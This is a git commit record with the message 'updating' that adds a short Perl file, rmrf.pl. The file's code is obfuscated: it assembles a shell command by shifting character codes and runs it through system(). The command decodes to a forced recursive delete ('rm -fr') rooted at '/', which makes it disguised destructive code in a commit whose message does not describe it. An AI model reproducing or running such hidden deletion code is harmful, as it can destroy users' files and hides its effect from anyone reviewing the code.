28486265b3d90b514344ffcc4083af1e533af3d6
Daniel Bolton <danielbarrettbolton@gmail.com>
2010-02-17 09:23:46 -0500

    updating

---
+++ rmrf.pl
@@ -0,0 +1,5 @@
+$I='*#/&';$II='%#';@2=qq!\ !;foreach(split//,
+$I){push@1,(chr(ord("$_")+67));}foreach(split
+//,$II){push@0,chr((ord("$_")+10));}system(("
+$1[2]$1[0]$2[0]$0[1]$1[1]$1[2]$2[0]$0[0]$0[1]
+"));until(defined($$)){(chop@ARGV[1]);chomp;}
